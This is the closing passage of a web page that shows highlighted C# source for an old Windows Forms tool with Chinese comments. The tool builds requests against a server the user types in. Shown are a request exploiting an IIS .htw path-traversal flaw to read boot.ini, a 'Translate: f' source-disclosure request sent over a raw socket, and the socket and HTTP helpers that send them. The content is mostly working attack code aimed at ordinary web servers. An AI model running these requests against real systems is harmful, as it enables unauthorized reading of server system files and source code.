                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20.htw?&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;CiWebHitsFile=/../../boot.ini&amp;CiRestriction=none&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;&amp;CiHiliteType=Full&quot;</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">default</span><span class="token punctuation">:</span>
                        strRequestFile <span class="token operator">=</span> strServer <span class="token operator">+</span> strUrl <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Text<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">this</span><span class="token punctuation">.</span>barStatus<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;发送请求：&quot;</span>
                <span class="token operator">+</span> <span class="token punctuation">(</span>strRequestFile<span class="token punctuation">.</span>Length <span class="token operator">&gt;=</span> <span class="token number">50</span> <span class="token punctuation">?</span>
                strRequestFile<span class="token punctuation">.</span><span class="token function">Substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span>
                <span class="token punctuation">:</span> strRequestFile<span class="token punctuation">)</span>
                <span class="token operator">+</span> <span class="token string">&quot;...&quot;</span><span class="token punctuation">;</span>

                <span class="token class-name"><span class="token keyword">string</span></span> strResult<span class="token punctuation">;</span>
                <span class="token comment">//如果不是translate:f方法则可以直接发送http请求</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>SelectedIndex <span class="token operator">!=</span> <span class="token number">20</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token comment">//直接发送http请求</span>
                    strResult <span class="token operator">=</span> <span class="token function">Get_Http</span><span class="token punctuation">(</span>strRequestFile<span class="token punctuation">)</span><span class="token punctuation">;</span>

                    <span class="token keyword">this</span><span class="token punctuation">.</span>barStatus<span class="token punctuation">.</span>Text <span class="token operator">+=</span> <span class="token string">&quot;完成。&quot;</span><span class="token punctuation">;</span>
                    strResult <span class="token operator">=</span> strResult <span class="token operator">==</span> <span class="token string">&quot;&quot;</span> <span class="token punctuation">?</span> <span class="token string">&quot;未找到！&quot;</span> <span class="token punctuation">:</span> strResult<span class="token punctuation">;</span>
                    <span class="token keyword">this</span><span class="token punctuation">.</span>txtResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> strResult<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">else</span> <span class="token comment">//translate:f方法需要建立tcp/ip连接</span>
                <span class="token punctuation">{</span>
                    <span class="token class-name"><span class="token keyword">string</span></span> strRequest <span class="token operator">=</span> <span class="token string">&quot;GET &quot;</span> <span class="token operator">+</span> strServer <span class="token operator">+</span> strUrl
                    <span class="token operator">+</span> <span class="token string">&quot;\\r\\nHTTP/1.0\\r\\nTranslate:f\\r\\n&quot;</span><span class="token punctuation">;</span>
                    strResult <span class="token operator">=</span> <span class="token function">Get_Socket_Request</span><span class="token punctuation">(</span>strServer<span class="token punctuation">,</span> strRequest<span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">this</span><span class="token punctuation">.</span>barStatus<span class="token punctuation">.</span>Text <span class="token operator">+=</span> <span class="token string">&quot;完成。&quot;</span><span class="token punctuation">;</span>
                    strResult <span class="token operator">=</span> strResult <span class="token operator">==</span> <span class="token string">&quot;&quot;</span> <span class="token punctuation">?</span> <span class="token string">&quot;未找到！&quot;</span> <span class="token punctuation">:</span> strResult<span class="token punctuation">;</span>
                    <span class="token keyword">this</span><span class="token punctuation">.</span>txtResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> strResult<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

            <span class="token comment">//使按钮、输入款等恢复</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>txtServer<span class="token punctuation">.</span>ReadOnly <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>txtFileName<span class="token punctuation">.</span>ReadOnly <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>btnClear<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>btnGo<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">//通过同server建立tcp/ip连接，发送socket命令</span>
        <span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">string</span></span> <span class="token function">Get_Socket_Request</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> a_strServer<span class="token punctuation">,</span> <span class="token class-name"><span class="token keyword">string</span></span> a_strRequest<span class="token punctuation">,</span> <span class="token class-name">Int32</span> a_intPort<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment">//Set up variables and String to write to the server</span>
            <span class="token class-name">Encoding</span> ASCII <span class="token operator">=</span> Encoding<span class="token punctuation">.</span>Default<span class="token punctuation">;</span>
            <span class="token class-name"><span class="token keyword">string</span></span> Get <span class="token operator">=</span> a_strRequest <span class="token operator">+</span> <span class="token string">&quot;Connection: Close\\r\\n\\r\\n&quot;</span><span class="token punctuation">;</span>
            <span class="token comment">//string Get =</span>
            <span class="token class-name">Byte<span class="token punctuation">[</span><span class="token punctuation">]</span></span> ByteGet <span class="token operator">=</span> ASCII<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span>Get<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Byte<span class="token punctuation">[</span><span class="token punctuation">]</span></span> RecvBytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Byte</span><span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> strRetPage <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

            <span class="token comment">// IPAddress and IPEndPoint represent the endpoint that will</span>
            <span class="token comment">// receive the request</span>
            <span class="token class-name">IPAddress</span> hostadd <span class="token operator">=</span> DNS<span class="token punctuation">.</span><span class="token function">Resolve</span><span class="token punctuation">(</span>a_strServer<span class="token punctuation">.</span><span class="token function">Substring</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> a_strServer<span class="token punctuation">.</span>Length <span class="token operator">-</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">IPEndPoint</span> EPhost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">IPEndPoint</span><span class="token punctuation">(</span>hostadd<span class="token punctuation">,</span> a_intPort<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">//Create the Socket for sending data over TCP</span>
            <span class="token class-name">Socket</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Socket</span><span class="token punctuation">(</span>AddressFamily<span class="token punctuation">.</span>AfINet<span class="token punctuation">,</span> SocketType<span class="token punctuation">.</span>SockStream<span class="token punctuation">,</span>
            ProtocolType<span class="token punctuation">.</span>ProtTCP<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// Connect to host using IPEndPoint</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span>EPhost<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                strRetPage <span class="token operator">=</span> <span class="token string">&quot;Unable to connect to host&quot;</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> strRetPage<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token comment">// Sent the GET text to the host</span>
            s<span class="token punctuation">.</span><span class="token function">Send</span><span class="token punctuation">(</span>ByteGet<span class="token punctuation">,</span> ByteGet<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// Receive the page, loop until all bytes are received</span>
            <span class="token class-name">Int32</span> bytes <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>RecvBytes<span class="token punctuation">,</span> RecvBytes<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            strRetPage <span class="token operator">=</span> strRetPage <span class="token operator">+</span> ASCII<span class="token punctuation">.</span><span class="token function">GetString</span><span class="token punctuation">(</span>RecvBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">while</span> <span class="token punctuation">(</span>bytes <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                bytes <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>RecvBytes<span class="token punctuation">,</span> RecvBytes<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                strRetPage <span class="token operator">=</span> strRetPage <span class="token operator">+</span> ASCII<span class="token punctuation">.</span><span class="token function">GetString</span><span class="token punctuation">(</span>RecvBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">return</span> strRetPage<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">//获取http页面函数</span>
        <span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">string</span></span> <span class="token function">Get_Http</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> a_strUrl<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token class-name"><span class="token keyword">string</span></span> strResult<span class="token punctuation">;</span>
            <span class="token class-name">HttpWebRequest</span> myReq <span class="token operator">=</span> <span class="token punctuation">(</span>HttpWebRequest<span class="token punctuation">)</span>
            WebRequestFactory<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span>a_strUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">try</span>
            <span class="token punctuation">{</span>
                <span class="token class-name">HttpWebResponse</span> HttpWResp <span class="token operator">=</span> <span class="token punctuation">(</span>HttpWebResponse<span class="token punctuation">)</span>myReq<span class="token punctuation">.</span><span class="token function">GetResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Stream</span> myStream <span class="token operator">=</span> HttpWResp<span class="token punctuation">.</span><span class="token function">GetResponseStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token class-name">StreamReader</span> sr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StreamReader</span><span class="token punctuation">(</span>myStream<span class="token punctuation">,</span> Encoding<span class="token punctuation">.</span>Default<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">StringBuilder</span> strBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">!=</span> sr<span class="token punctuation">.</span><span class="token function">Peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    strBuilder<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>sr<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;\\r\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                strResult <span class="token operator">=</span> strBuilder<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> exp<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                strResult <span class="token operator">=</span> <span class="token string">&quot;错误：&quot;</span> <span class="token operator">+</span> exp<span class="token punctuation">.</span>Message<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">return</span> strResult<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">//退出</span>
        <span class="token keyword">protected</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">mnuExit_Click</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sender<span class="token punctuation">,</span> <span class="token class-name">System<span class="token punctuation">.</span>EventArgs</span> e<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">&quot;真的退出吗？&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;退出系统&quot;</span><span class="token punctuation">,</span> MessageBox<span class="token punctuation">.</span>YesNo<span class="token punctuation">)</span> <span class="token operator">==</span> DialogResult<span class="token punctuation">.</span>Yes<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token comment">//主函数</span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> args<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            Application<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token constructor-invocation class-name">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div>`,5),e=[o];function c(u,l){return s(),a("div",null,e)}const i=n(p,[["render",c],["__file","netcode15.html.vue"]]);export{i as default};
